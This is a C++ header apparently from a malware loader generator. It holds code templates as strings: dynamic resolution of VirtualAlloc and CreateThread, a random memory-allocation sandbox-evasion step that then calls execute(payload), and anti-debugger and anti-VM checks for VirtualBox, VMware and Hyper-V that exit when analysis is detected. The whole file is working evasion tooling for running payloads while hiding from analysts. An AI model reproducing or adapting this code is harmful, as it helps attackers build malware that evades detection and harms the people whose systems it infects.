// constants.h
#ifndef CONSTANTS_H
#define CONSTANTS_H

#include <string>

const std::string DYN_GLOBALS = R"(
typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *VirtualFree_t)(LPVOID, SIZE_T, DWORD);
typedef HMODULE (WINAPI *LoadLibraryA_t)(LPCSTR);
typedef FARPROC (WINAPI *GetProcAddress_t)(HMODULE, LPCSTR);
typedef HANDLE (WINAPI *CreateThread_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD (WINAPI *WaitForSingleObject_t)(HANDLE, DWORD);
typedef BOOL (WINAPI *CloseHandle_t)(HANDLE);
)";

const std::string DYN_RESOLUTION = R"(
    HMODULE kernel32 = LoadLibraryA("kernel32.dll");
    
    if (!kernel32) {
        cerr << "Failed to load kernel32.dll with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Successfully loaded kernel32.dll at address: " << kernel32 << "\n";
    }

    VirtualAlloc_t pVirtualAlloc = NULL;
    VirtualFree_t pVirtualFree = NULL;
    LoadLibraryA_t pLoadLibraryA = NULL;
    GetProcAddress_t pGetProcAddress = NULL;
    CreateThread_t pCreateThread = NULL;
    WaitForSingleObject_t pWaitForSingleObject = NULL;
    CloseHandle_t pCloseHandle = NULL;
    /**/

    // Resolve each function explicitly
    pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(kernel32, "VirtualAlloc");
    if (!pVirtualAlloc) {
        cerr << "Failed to resolve VirtualAlloc with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pVirtualAlloc at address: " << (void*)pVirtualAlloc << "\n";
    }

    pVirtualFree = (VirtualFree_t)GetProcAddress(kernel32, "VirtualFree");
    if (!pVirtualFree) {
        cerr << "Failed to resolve VirtualFree with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pVirtualFree at address: " << (void*)pVirtualFree << "\n";
    }

    pLoadLibraryA = (LoadLibraryA_t)GetProcAddress(kernel32, "LoadLibraryA");
    if (!pLoadLibraryA) {
        cerr << "Failed to resolve LoadLibraryA with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pLoadLibraryA at address: " << (void*)pLoadLibraryA << "\n";
    }

    pGetProcAddress = (GetProcAddress_t)GetProcAddress(kernel32, "GetProcAddress");
    if (!pGetProcAddress) {
        cerr << "Failed to resolve GetProcAddress with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pGetProcAddress at address: " << (void*)pGetProcAddress << "\n";
    }

    pCreateThread = (CreateThread_t)GetProcAddress(kernel32, "CreateThread");
    if (!pCreateThread) {
        cerr << "Failed to resolve CreateThread with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pCreateThread at address: " << (void*)pCreateThread << "\n";
    }

    pWaitForSingleObject = (WaitForSingleObject_t)GetProcAddress(kernel32, "WaitForSingleObject");
    if (!pWaitForSingleObject) {
        cerr << "Failed to resolve WaitForSingleObject with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pWaitForSingleObject at address: " << (void*)pWaitForSingleObject << "\n";
    }

    pCloseHandle = (CloseHandle_t)GetProcAddress(kernel32, "CloseHandle");
    if (!pCloseHandle) {
        cerr << "Failed to resolve CloseHandle with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pCloseHandle at address: " << (void*)pCloseHandle << "\n";
    }
)";

const std::string RAND_DEF = R"(
int getRand(){
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> distrib(100000000, 150000000);

    return distrib(gen);
}
)";

const std::string RAND_CALL = R"(
    int a = getRand();
    int b = getRand();

    char *blocka = NULL;
    blocka = (char *) malloc(a);

    if(blocka != NULL){
        memset(blocka, 00, a);
        free(blocka);
    }

    char *blockb = NULL;
    blockb = (char *) malloc(b);

    if(blockb != NULL){
        memset(blockb, 00, a);
        free(blockb);
        execute(payload);
    }

)";

const std::string DB_DEF = R"(
void antiDb(){
    
    if(IsDebuggerPresent()){
        cout << "\nDebugger present\nexiting...";
        cin.get();
        exit(0);
    } else {
        cout << "\nNo debugger attached...\n";
    }
}

)";

// Anti-VM Source Edited From: https://github.com/basedpill/detectvm
const std::string ANTI_VM_DEF = R"(
bool DetectBySystemManufacturer()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    //System manufacturer
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("SystemManufacturer"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Microsoft Corporation") == 0)
                return true;
        }
    }
    return false;
}
bool DetectByBiosVendor()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("BIOSVendor"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Microsoft Corporation") == 0)
                return true;
        }
    }

    return false;
}

bool DetectBySystemFamily()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("SystemFamily"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Virtual Machine") == 0)
                return true;
        }
    }

    return false;
}

bool DetectByProductName()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("SystemProductName"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Virtual Machine") == 0)
                return true;
        }
    }

    return false;
}

bool IsVboxVM(){
    HANDLE handle = CreateFile(_T("\\\\.\\VBoxMiniRdrDN"), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (handle != INVALID_HANDLE_VALUE){CloseHandle(handle); return true;}
    return false;
}

bool IsVMwareVM(){
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = {0}; DWORD dwBufSize = sizeof(buf);
    if( RegOpenKeyEx( HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\VMware, Inc.\\VMware Tools"), 0, KEY_QUERY_VALUE, &hKey ) == ERROR_SUCCESS ) {return true;}
    return false;
}

bool IsMsHyperV() {
    //Use multiple known reg entries to indicate Virtual Machines
    return DetectBySystemManufacturer() || DetectByBiosVendor() || DetectBySystemFamily()|| DetectByProductName();
}
void antiVm(){
    bool isVm = false;
    if (IsVboxVM() == true) {
        isVm = true; 
        printf("Running in vbox!");
    } else if (IsVMwareVM() == true) {
        isVm = true; 
        printf("Running in vmware!");
    } else if (IsMsHyperV() == true) {
        isVm = true; 
        printf("Running in hyper-v!");
    } else { 
        printf("Not running in a VM!");
    }
    
    if(isVm == true){
        printf("\nexiting...\n");
        std::cin.get();
        exit(0);
    }
}
)";

#endif // CONSTANTS_H